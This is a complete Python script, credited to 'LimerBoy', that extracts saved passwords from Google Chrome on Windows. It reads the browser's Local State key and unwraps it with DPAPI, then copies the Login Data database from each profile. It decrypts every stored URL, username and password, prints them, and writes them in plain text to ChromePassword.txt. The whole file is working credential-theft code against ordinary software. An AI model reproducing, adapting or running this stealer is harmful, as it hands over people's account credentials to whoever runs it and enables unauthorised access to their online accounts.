#Full Credits to LimerBoy
import os
import re
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil

# GLOBAL CONSTANTS
CHROME_PATH_LOCAL_STATE = os.path.normpath(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State'))
CHROME_PATH = os.path.normpath(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data'))

def get_secret_key():
    try:
        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        # Remove suffix DPAPI
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Chrome secretkey cannot be found")
        return None

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()
        return decrypted_pass
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""

def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Chrome database cannot be found")
        return None

if __name__ == '__main__':
    try:
        # Create Dataframe to store passwords
        output_path = os.path.normpath(os.path.join(os.environ['USERPROFILE'], 'ChromePassword.txt'))
        with open(output_path, mode='w', encoding='utf-8') as text_file:
            text_file.write("Decrypted Passwords:\n")
            # Get secret key
            secret_key = get_secret_key()
            if not secret_key:
                raise Exception("Chrome secret key not found.")

            # Search user profile or default folder (this is where the encrypted login password is stored)
            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", element) is not None]
            for folder in folders:
                # Get ciphertext from sqlite database
                chrome_path_login_db = os.path.join(CHROME_PATH, folder, 'Login Data')
                conn = get_db_connection(chrome_path_login_db)
                if conn:
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index, login in enumerate(cursor.fetchall()):
                        url, username, ciphertext = login
                        if url and username and ciphertext:
                            # Use AES algorithm to decrypt the password
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            print("Sequence: %d" % index)
                            print("URL: %s\nUser Name: %s\nPassword: %s\n" % (url, username, decrypted_password))
                            print("*" * 50)
                            # Write decrypted passwords to the text document
                            text_file.write(f"Sequence: {index}\n")
                            text_file.write(f"URL: {url}\nUser Name: {username}\nPassword: {decrypted_password}\n\n")
                    # Close database connection
                    cursor.close()
                    conn.close()
                    # Delete temp login db
                    os.remove("Loginvault.db")

        print("All decrypted passwords saved to ChromePassword.txt.")

    except Exception as e:
        print("[ERR] %s" % str(e))
